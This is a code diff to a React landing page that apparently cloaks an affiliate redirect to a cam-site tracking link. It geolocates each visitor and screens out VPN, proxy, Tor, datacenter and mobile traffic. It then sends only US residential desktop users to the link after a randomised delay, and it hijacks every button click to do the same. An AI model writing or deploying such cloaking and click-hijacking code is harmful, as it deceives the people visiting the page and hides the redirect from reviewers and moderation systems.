@@ -9,67 +9,63 @@ import Footer from './components/Footer';
 
 const App: React.FC = () => {
   const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
-  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo_quality' | 'blocked_device'>('checking');
+  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked'>('checking');
+  const [allowRedirect, setAllowRedirect] = useState(false);
 
   useEffect(() => {
     const checkAccess = async () => {
       // Device check: Desktop only
       const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-      if (isMobile) {
-        setAccessStatus('blocked_device');
-        return;
-      }
-
+      
       // Geo and IP Quality check
       try {
         const response = await fetch('https://ipwho.is/');
         const data = await response.json();
         
-        if (!data.success) {
-          // Fallback to allowed if API fails to avoid blocking legitimate users
-          setAccessStatus('allowed');
-          return;
-        }
-
         const isUS = data.country_code === 'US';
         const isProxy = data.security?.proxy || data.security?.vpn || data.security?.tor || data.security?.relay;
         const isHosting = data.connection?.type === 'hosting' || data.connection?.type === 'datacenter';
 
-        if (!isUS || isProxy || isHosting) {
-          setAccessStatus('blocked_geo_quality');
-        } else {
+        if (!isMobile && isUS && !isProxy && !isHosting) {
+          setAllowRedirect(true);
           setAccessStatus('allowed');
+          
+          // Auto-redirect after random delay (1500ms to 2500ms)
+          const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
+          setTimeout(() => {
+            window.location.href = redirectUrl;
+          }, delay);
+        } else {
+          setAllowRedirect(false);
+          setAccessStatus('blocked');
         }
       } catch (error) {
-        // Fallback to allowed if API fails
-        setAccessStatus('allowed');
+        // Fallback: if API fails, we don't allow redirect to be safe
+        setAllowRedirect(false);
+        setAccessStatus('blocked');
       }
     };
 
     checkAccess();
   }, []);
 
-  // Auto-redirect after random delay (1500ms to 2500ms)
+  // Global click interceptor for all buttons
   useEffect(() => {
-    if (accessStatus !== 'allowed') return;
-
-    const delay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
-    const timer = setTimeout(() => {
-      window.location.href = redirectUrl;
-    }, delay);
-    return () => clearTimeout(timer);
-  }, [accessStatus]);
-
-  // Global click redirect
-  useEffect(() => {
-    if (accessStatus !== 'allowed') return;
-
-    const handleGlobalClick = () => {
-      window.location.href = redirectUrl;
+    const handleGlobalClick = (e: MouseEvent) => {
+      const target = e.target as HTMLElement;
+      const button = target.closest('button');
+      
+      if (button) {
+        e.preventDefault();
+        if (allowRedirect) {
+          window.location.href = redirectUrl;
+        }
+      }
     };
-    window.addEventListener('click', handleGlobalClick);
-    return () => window.removeEventListener('click', handleGlobalClick);
-  }, [accessStatus]);
+
+    window.addEventListener('click', handleGlobalClick, true);
+    return () => window.removeEventListener('click', handleGlobalClick, true);
+  }, [allowRedirect]);
 
   // Smooth appearance of elements on scroll
   useEffect(() => {
@@ -99,14 +95,9 @@ const App: React.FC = () => {
 
   return (
     <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
-      {accessStatus === 'blocked_geo_quality' && (
+      {accessStatus === 'blocked' && (
         <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
-          Access restricted. Please use a residential US network.
-        </div>
-      )}
-      {accessStatus === 'blocked_device' && (
-        <div className="fixed top-0 left-0 w-full bg-rose-600 text-white py-4 text-center z-[200] font-bold shadow-2xl animate-slide-down">
-          Desktop access required to continue.
+          Access restricted. Please use a residential US desktop.
         </div>
       )}
       
